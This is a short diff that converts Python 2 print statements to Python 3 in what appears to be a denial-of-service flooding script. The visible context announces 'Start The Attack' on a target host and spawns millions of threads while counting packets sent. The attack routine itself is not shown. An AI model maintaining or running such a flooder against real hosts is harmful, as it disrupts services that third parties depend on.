@@ -96,7 +96,7 @@ print(" ")
 os.system('espeak  Start-The-Attack-to-'+host)
 os.system('clear')
 print ("\033[94m[+] \033[97mStart The \033[97mAttack\033[97m...")
-print ""
+print ("")
 def tetew(s):
 	for c in s + '\n':
 		sys.stdout.write(c)
@@ -118,5 +118,5 @@ for i in range(1,10000000):
 	galau = threading.Thread(target = janda)
 	galau.daemon = True
 	galau.start()
-	print " [!]\033[95mTotal Paket\033[0m | \033[92m",i
+	print (" [!]\033[95mTotal Paket\033[0m | \033[92m",i)
 print ("DONE !")
